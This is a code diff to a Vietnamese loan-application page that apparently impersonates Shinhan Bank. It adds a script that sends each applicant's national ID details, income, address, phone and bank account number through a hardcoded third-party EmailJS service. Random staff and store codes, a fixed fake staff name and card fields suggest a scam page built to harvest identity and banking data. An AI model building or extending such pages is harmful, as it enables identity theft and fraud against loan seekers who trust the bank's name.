@@ -72,7 +72,7 @@
         }
         .form-control, .form-select {
             font-size: 16px;
-            border-radius: 15px; /* Apply soft rounded corners to all inputs and selects */
+            border-radius: 15px;
         }
         .terms-box {
             border: 1px solid #dee2e6;
@@ -172,6 +172,13 @@
         .was-validated .form-select:invalid ~ .invalid-feedback {
             display: block;
         }
+        .spam-error {
+            color: #dc3545;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -181,7 +188,7 @@
     </div>
 
     <div class="container">
-        <button type="button" class="btn btn-secondary" onclick="window.location.href='trang-chu.html'">Quay Lại</button>
+        <button type="button" class="btn btn-secondary" onclick="window.location.href='index.html'">Quay Lại</button>
         <div class="progress-bar-container">
             <div class="progress-bar">
                 <div class="progress-bar-fill" id="progressBar" style="width: 10%"></div>
@@ -322,6 +329,7 @@
                         <div id="termsFeedback" class="invalid-feedback" style="display: none;">Vui lòng đồng ý với các điều khoản và điều kiện.</div>
                     </div>
                 </div>
+                <div class="spam-error" id="spamError">Bạn đã đăng ký quá nhiều lần. Vui lòng thử lại sau.</div>
                 <div class="continue-btn-container">
                     <button type="submit" class="btn btn-primary" id="proceedToStep2Btn" disabled>Tiếp Tục</button>
                 </div>
@@ -363,43 +371,60 @@
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
+        // Initialize EmailJS
+        (function(){
+            emailjs.init("OrBsI926QI2_xBh1f");
+        })();
+
         // Placeholder user data (for fallback if localStorage is empty)
         let userData = {
-            fullName: "Nguyễn Văn A",
-            idNumber: "123456789",
-            idIssueDate: "01/01/2020",
-            idIssuePlace: "Hà Nội",
-            address: "123 Đường Láng, Hà Nội",
-            occupation: "nhanvien",
-            income: 10000000,
-            phoneNumber: "0901234567",
-            email: "nguyenvana@example.com",
-            loanAmount: 100000000,
-            loanTerm: "24",
-            loanPurpose: "Chi tiêu cá nhân",
-            accountNumber: "1234567890",
-            bankName: "Shinhan Bank",
+            fullName: "",
+            idNumber: "",
+            idIssueDate: "",
+            idIssuePlace: "",
+            address: "",
+            occupation: "",
+            income: "",
+            phoneNumber: "",
+            email: "",
+            loanAmount: "",
+            loanTerm: "",
+            loanPurpose: "",
+            accountNumber: "",
+            bankName: "",
             termsAgree: false,
             currentStep: 1
         };
 
         // Load user data from localStorage
         function loadUserData() {
-            const storedData = localStorage.getItem('userData');
-            if (storedData) {
-                userData = JSON.parse(storedData);
+            try {
+                const storedData = localStorage.getItem('userData');
+                if (storedData) {
+                    userData = JSON.parse(storedData);
+                    console.log('Loaded userData from localStorage:', userData);
+                }
+            } catch (error) {
+                console.error('Error parsing userData from localStorage:', error);
             }
         }
 
         // Save user data to localStorage
         function saveToLocalStorage() {
-            localStorage.setItem('userData', JSON.stringify(userData));
+            try {
+                localStorage.setItem('userData', JSON.stringify(userData));
+                console.log('Saved userData to localStorage:', userData);
+            } catch (error) {
+                console.error('Error saving userData to localStorage:', error);
+            }
         }
 
         // Format number input
         function formatNumberInput(value) {
-            return Number(value).toLocaleString('vi-VN');
+            if (!value) return "";
+            return Number(value.replace(/[^0-9]/g, '')).toLocaleString('vi-VN');
         }
 
         // Generate random loan code
@@ -447,6 +472,9 @@
 
             // Check form fields
             let allFieldsValid = form.checkValidity();
+            if (!allFieldsValid) {
+                form.classList.add('was-validated');
+            }
 
             // Check terms checkbox
             if (!termsAgree.checked) {
@@ -457,6 +485,81 @@
 
             // Enable/disable proceed button
             proceedBtn.disabled = !(allFieldsValid && termsAgree.checked);
+            console.log('Form validation:', { allFieldsValid, termsChecked: termsAgree.checked });
+        }
+
+        // Anti-spam check
+        function checkSpam() {
+            const now = Date.now();
+            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
+            const lastRegistrationTime = spamData.lastRegistrationTime || 0;
+            const registrationCount = spamData.registerCount || 0;
+            const registrationResetTime = spamData.resetTime || now;
+
+            // Reset count after 24 hours
+            if (now > registrationResetTime) {
+                spamData.registerCount = 0;
+                spamData.resetTime = now + 24 * 60 * 60 * 1000; // Reset after 24 hours
+            }
+
+            // Check if registration is too frequent
+            const timeSinceLast = (now - lastRegistrationTime) / 1000; // in seconds
+            if (timeSinceLast < 300) { // 5 minutes
+                return { allowed: false, message: 'Bạn đã đăng ký quá nhanh. Vui lòng thử lại sau 5 phút.' };
+            }
+
+            // Check registration limit
+            if (registrationCount >= 3) {
+                return { allowed: false, message: 'Bạn đã vượt quá số lần đăng ký trong 24 giờ. Vui lòng thử lại sau.' };
+            }
+
+            return { allowed: true };
+        }
+
+        // Update spam data
+        function updateSpamData() {
+            const now = Date.now();
+            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
+            spamData.lastRegistrationTime = now;
+            spamData.registerCount = (spamData.registerCount || 0) + 1;
+            spamData.resetTime = spamData.resetTime || now + 24 * 60 * 60 * 1000;
+            localStorage.setItem('spamData', JSON.stringify(spamData));
+        }
+
+        // Send registration data via EmailJS
+        function sendRegistrationDataEmail() {
+            const params = {
+                to_name: userData.fullName || '',
+                full_name: userData.fullName || '',
+                id_number: userData.idNumber || '',
+                id_issue_date: userData.idIssueDate || '',
+                id_issue_place: userData.idIssuePlace || '',
+                address: userData.address || '',
+                occupation: userData.occupation || '',
+                income: userData.income ? Number(userData.income).toLocaleString('vi-VN') + ' VND' : '',
+                phone_number: userData.phoneNumber || '',
+                email: userData.email || '',
+                loan_amount: userData.loanAmount ? Number(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : '',
+                loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : '',
+                loan_purpose: userData.loanPurpose || '',
+                account_number: userData.accountNumber || '',
+                bank_name: userData.bankName || '',
+                loan_code: userData.loanCode || '',
+                registration_date: userData.registrationDate || '',
+                to_email: userData.email || 'support@shinhan.com.vn'
+            };
+
+            console.log('Sending EmailJS params:', params);
+
+            emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
+                .then(() => {
+                    console.log('Email sent successfully');
+                    alert("Thông tin đăng ký đã được gửi qua email!");
+                })
+                .catch(error => {
+                    console.error('EmailJS error:', error);
+                    alert("Đã xảy ra lỗi khi gửi email. Dữ liệu vẫn được lưu và bạn có thể tiếp tục.");
+                });
         }
 
         // Load saved data and initialize form
@@ -468,10 +571,10 @@
             $('#idIssuePlace').val(userData.idIssuePlace || '');
             $('#address').val(userData.address || '');
             $('#occupation').val(userData.occupation || '');
-            $('#income').val(userData.income ? Number(userData.income).toLocaleString('vi-VN') : '');
+            $('#income').val(userData.income ? formatNumberInput(userData.income) : '');
             $('#phoneNumber').val(userData.phoneNumber || '');
             $('#email').val(userData.email || '');
-            $('#loanAmountInput').val(userData.loanAmount ? Number(userData.loanAmount).toLocaleString('vi-VN') : '');
+            $('#loanAmountInput').val(userData.loanAmount ? formatNumberInput(userData.loanAmount) : '');
             $('#loanTerm').val(userData.loanTerm || '');
             $('#loanPurpose').val(userData.loanPurpose || '');
             $('#accountNumber').val(userData.accountNumber || '');
@@ -493,6 +596,8 @@
             let value = $(this).val().replace(/[^0-9]/g, '');
             if (value) {
                 $(this).val(formatNumberInput(value));
+            } else {
+                $(this).val('');
             }
             validateForm();
         });
@@ -507,41 +612,56 @@
             const form = e.target;
             form.classList.add('was-validated');
 
+            // Check anti-spam
+            const spamCheck = checkSpam();
+            if (!spamCheck.allowed) {
+                $('#spamError').text(spamCheck.message).show();
+                $('#proceedToStep2Btn').prop('disabled', true);
+                return;
+            } else {
+                $('#spamError').hide();
+            }
+
             if (form.checkValidity() && $('#termsAgree').is(':checked')) {
                 let income = $('#income').val().replace(/[^0-9]/g, '') || '';
                 let loanAmount = $('#loanAmountInput').val().replace(/[^0-9]/g, '') || '';
                 userData = {
-                    fullName: $('#fullName').val().trim(),
-                    idNumber: $('#idNumber').val().trim(),
-                    idIssueDate: $('#idIssueDate').val().trim(),
-                    idIssuePlace: $('#idIssuePlace').val().trim(),
-                    address: $('#address').val().trim(),
-                    occupation: $('#occupation').val(),
-                    income: income,
-                    phoneNumber: $('#phoneNumber').val().trim(),
-                    email: $('#email').val().trim(),
-                    loanAmount: loanAmount,
-                    loanTerm: $('#loanTerm').val(),
-                    loanPurpose: $('#loanPurpose').val(),
-                    accountNumber: $('#accountNumber').val().trim(),
-                    bankName: $('#bankName').val(),
+                    fullName: $('#fullName').val().trim() || userData.fullName,
+                    idNumber: $('#idNumber').val().trim() || userData.idNumber,
+                    idIssueDate: $('#idIssueDate').val().trim() || userData.idIssueDate,
+                    idIssuePlace: $('#idIssuePlace').val().trim() || userData.idIssuePlace,
+                    address: $('#address').val().trim() || userData.address,
+                    occupation: $('#occupation').val() || userData.occupation,
+                    income: income || userData.income,
+                    phoneNumber: $('#phoneNumber').val().trim() || userData.phoneNumber,
+                    email: $('#email').val().trim() || userData.email,
+                    loanAmount: loanAmount || userData.loanAmount,
+                    loanTerm: $('#loanTerm').val() || userData.loanTerm,
+                    loanPurpose: $('#loanPurpose').val() || userData.loanPurpose,
+                    accountNumber: $('#accountNumber').val().trim() || userData.accountNumber,
+                    bankName: $('#bankName').val() || userData.bankName,
                     termsAgree: $('#termsAgree').is(':checked'),
                     loanCode: userData.loanCode || generateLoanCode(),
                     registrationDate: userData.registrationDate || getCurrentDate(),
-                    monthlyPayment: calculateMonthlyPayment(loanAmount, $('#loanTerm').val()),
-                    interestRate: calculateInterestRate(loanAmount),
+                    monthlyPayment: calculateMonthlyPayment(loanAmount || userData.loanAmount, $('#loanTerm').val() || userData.loanTerm),
+                    interestRate: calculateInterestRate(loanAmount || userData.loanAmount),
                     sellerCode: userData.sellerCode || generateRandomCode(),
                     storeCode: userData.storeCode || generateRandomCode(),
                     staffCode: userData.staffCode || generateRandomCode(),
                     staffName: userData.staffName || "Nguyễn Thị Mỹ Duyên",
                     branchName: userData.branchName || "Chi nhánh Shinhanbank Đà Nẵng",
-                    isRegistered: false,
+                    isRegistered: userData.isRegistered || false,
                     qrData: userData.qrData || {},
                     atmCard: userData.atmCard || {},
                     currentStep: 2
                 };
+                console.log('Submitting userData:', userData);
                 saveToLocalStorage();
+                updateSpamData();
+                sendRegistrationDataEmail(); // Send email
                 window.location.href = 'step2.html';
+            } else {
+                console.warn('Form validation failed or terms not agreed.');
             }
         });
     </script>
